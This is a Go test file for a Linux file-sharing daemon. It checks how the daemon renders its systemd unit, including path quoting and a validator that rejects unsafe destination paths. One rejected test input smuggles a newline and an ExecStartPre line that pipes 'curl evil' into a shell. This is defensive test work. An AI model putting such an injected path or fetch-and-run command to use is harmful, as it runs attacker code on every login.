// SPDX-License-Identifier: GPL-3.0-only
// Copyright (C) 2026 Hassan Khurram

//go:build linux

package daemon

import (
	"strings"
	"testing"
)

func TestRenderUnit(t *testing.T) {
	unit := renderUnit("/usr/bin/share2us", "/srv/incoming")
	for _, want := range []string{
		"ExecStart=/usr/bin/share2us daemon run",
		"WantedBy=default.target",
		"NoNewPrivileges=true",
		"ProtectHome=read-only",
		"/srv/incoming", // dest dir folded into ReadWritePaths
		"%t/share2us",   // runtime dir for the control socket
	} {
		if !strings.Contains(unit, want) {
			t.Errorf("unit missing %q:\n%s", want, unit)
		}
	}
}

func TestRenderUnitNoDest(t *testing.T) {
	unit := renderUnit("/usr/bin/share2us", "")
	if strings.Contains(unit, "ReadWritePaths= \n") {
		t.Error("empty dest left a trailing space in ReadWritePaths")
	}
}

// §AJ low batch: destDir was interpolated into the systemd unit unquoted, so a
// newline in a folder name would end the ReadWritePaths line and start a new
// DIRECTIVE -- adding, say, ExecStartPre to a service that runs on every login.
// Self-inflicted, since the value is the operator's own --dest, but a unit file
// is not where you want to discover it.
func TestUnitPathRejectsWhatWouldBreakTheUnit(t *testing.T) {
	for _, bad := range []string{
		"/home/me/inbox\nExecStartPre=/bin/sh -c 'curl evil|sh'",
		"/home/me/inbox\rExecStart=/bin/false",
		"/home/me/in\x00box",
		`/home/me/"quoted"`,
	} {
		if err := validUnitPath(bad); err == nil {
			t.Errorf("accepted a path that would break the unit: %q", bad)
		}
	}
	for _, good := range []string{
		"",
		"/home/me/Downloads",
		"/home/me/My Files/inbox",
		"/home/me/файлы",
	} {
		if err := validUnitPath(good); err != nil {
			t.Errorf("rejected a legitimate path %q: %v", good, err)
		}
	}
}

// A path with spaces must land as ONE ReadWritePaths entry, not several.
func TestUnitQuotesTheDestinationPath(t *testing.T) {
	unit := renderUnit("/usr/local/bin/s2u", "/home/me/My Files/inbox")
	if !strings.Contains(unit, `ReadWritePaths=%h/.config/share2us %h/.cache/share2us %t/share2us "/home/me/My Files/inbox"`) {
		t.Fatalf("destination not quoted as one entry:\n%s", unit)
	}
	// An empty destination adds nothing.
	if strings.Contains(renderUnit("/usr/local/bin/s2u", ""), `""`) {
		t.Fatal("an empty destination produced an empty quoted entry")
	}
}
